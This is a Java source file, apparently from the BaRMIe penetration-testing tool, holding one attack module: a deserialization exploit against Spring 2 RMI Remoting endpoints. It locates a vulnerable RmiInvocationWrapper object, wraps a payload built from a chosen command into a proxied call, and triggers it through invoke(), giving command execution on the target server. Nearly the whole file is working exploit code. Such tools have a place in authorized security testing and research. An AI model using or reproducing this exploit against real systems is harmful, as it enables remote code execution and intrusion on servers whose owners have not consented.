package nb.barmie.modes.attack.attacks.SpringFramework;

import java.rmi.registry.Registry;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;
import nb.barmie.modes.attack.RMIDeserAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;
import org.springframework.remoting.rmi.RmiInvocationHandler;
import org.springframework.remoting.support.RemoteInvocation;

/***********************************************************
 * Deliver a deserialization payload to a Spring 2 RMI
 * Remoting endpoint, via an Object-type property of a
 * remote method parameter.
 * 
 * Calls RmiInvocationHandler.invoke() with a
 * RemoteInvocation object that contains the payload.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class Spring2RmiInvocationHandlerDeser extends RMIDeserAttack {
	/*******************
	 * Set attack properties.
	 ******************/
	public Spring2RmiInvocationHandlerDeser() {
		super();
		this.setDescription("Spring 2 RMI Remoting deserialization");
		this.setDetailedDescription("Spring RMI Remoting exposes a remote class with an invoke() method that accepts a RemoteInvocation object as a parameter. The RemoteInvocation object has a property that can hold any Object, enabling deserialization attacks.");
		this.setRemediationAdvice("[Spring 2 Remoting] " + REMEDIATION_NO_FIX);
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("org.springframework.remoting.rmi.RmiInvocationWrapper_Stub");
	}
	
	/*******************
	 * Execute the deserialization attack against the given RMI endpoint using
	 * the given payload.
	 * 
	 * @param ep The enumerated RMI endpoint.
	 * @param payload The deserialization payload to deliver.
	 * @param cmd The command to use for payload generation.
	 ******************/
	public void executeAttack(RMIEndpoint ep, DeserPayload payload, String cmd) throws BaRMIeException {
		RmiInvocationHandler rmih;
		RemoteInvocation ri;
		Registry reg;
		String objName;
		
		//Find an affected object to target
		System.out.println("[~] Finding object to target...");
		objName = ep.findObjectWithClass("org.springframework.remoting.rmi.RmiInvocationWrapper_Stub");
		
		//Launch the attack
		try {
			//Get the fully proxied target object
			System.out.println("[~] Getting proxied " + objName + " object...");
			rmih = (RmiInvocationHandler)this.getProxiedObject(ep, objName, payload.getBytes(cmd, 8));
			
			//Trigger the attack
			System.out.println("[+] Retrieved, invoking invoke() with payload...");
			ri = new RemoteInvocation();
			ri.arguments = new Object[] { this.DEFAULT_MARKER_OBJECT };
			rmih.invoke(ri);
		} catch(Exception ex) {
			//Check the exception for useful info
			this.checkDeserException(ex);
		}
	}
}
